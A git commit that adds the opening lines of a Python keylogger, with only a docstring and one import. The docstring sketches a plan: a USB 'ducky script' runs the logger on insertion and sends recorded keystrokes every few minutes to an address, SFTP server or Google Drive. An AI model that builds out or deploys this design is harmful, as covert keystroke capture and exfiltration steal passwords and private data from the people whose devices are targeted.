357347450b6daafde57d71a4d08e68ed57134031
Tilka35 <B00133250@mytudublin.ie>
2025-05-03 16:18:18 +0100

    Initial Commit

---
+++ Tools/python/Loggers/logger.py
@@ -0,0 +1,8 @@
+"""
+Kinda self explanatory, but a keylogger written in python. Gonna work on making a ducky script that does the exact same thing as this script. This is just kind of an experiment. 
+- The ducky script will activate once the USB is inserted into whatever device. Then this script will run. The idea for the script is to either display the keystrokes in real-time or to send a file with the recorded strokes every 5 mins for example to a certain address.
+- Can be made to upload to SFTP server or Google Drive API"""
+
+
+# Imports
+import keyboard
